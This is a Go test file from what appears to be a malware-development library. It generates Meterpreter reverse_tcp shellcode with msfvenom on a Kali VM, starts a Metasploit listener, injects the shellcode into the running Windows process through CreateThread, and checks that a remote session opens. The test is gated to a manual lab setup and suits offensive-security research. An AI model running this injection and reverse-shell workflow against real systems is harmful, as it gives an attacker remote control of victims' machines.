//go:build windows

package meterpreter

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/oioio-space/maldev/inject"
	"github.com/oioio-space/maldev/testutil"
)

// TestMeterpreterRealSession generates real shellcode via msfvenom on Kali,
// injects it into the current process via CreateThread, and verifies that
// a Meterpreter session opens on the Kali handler.
//
// Requires: MALDEV_MANUAL=1, Windows VM, Kali VM running with SSH on port 2223.
func TestMeterpreterRealSession(t *testing.T) {
	testutil.RequireManual(t)
	testutil.RequireIntrusive(t)

	// Verify Kali SSH is reachable before trying.
	probe := testutil.KaliSSH(t, "echo OK", 5*time.Second)
	if probe != "OK" {
		t.Skip("Kali VM not reachable via SSH — run from host with SSH port forwarding")
	}

	// 1. Generate real reverse_tcp shellcode on Kali.
	sc := testutil.KaliGenerateShellcode(t,
		"windows/x64/meterpreter/reverse_tcp",
		testutil.KaliHost, "4444")
	require.True(t, len(sc) > 100, "shellcode must be non-trivial (%d bytes)", len(sc))

	// 2. Start Metasploit handler on Kali.
	cleanup := testutil.KaliStartListener(t,
		"windows/x64/meterpreter/reverse_tcp",
		"0.0.0.0", "4444")
	defer cleanup()

	// 3. Inject shellcode via CreateThread (WinAPI).
	inj, err := inject.Build().
		Method(inject.MethodCreateThread).
		Create()
	require.NoError(t, err, "build injector")
	require.NoError(t, inj.Inject(sc), "inject shellcode")

	// 4. Wait for meterpreter to connect and session to open.
	t.Log("Shellcode injected, waiting 15s for session...")
	time.Sleep(15 * time.Second)

	// 5. Verify session on Kali.
	assert.True(t, testutil.KaliCheckSession(t),
		"Meterpreter session must be established on Kali")
}
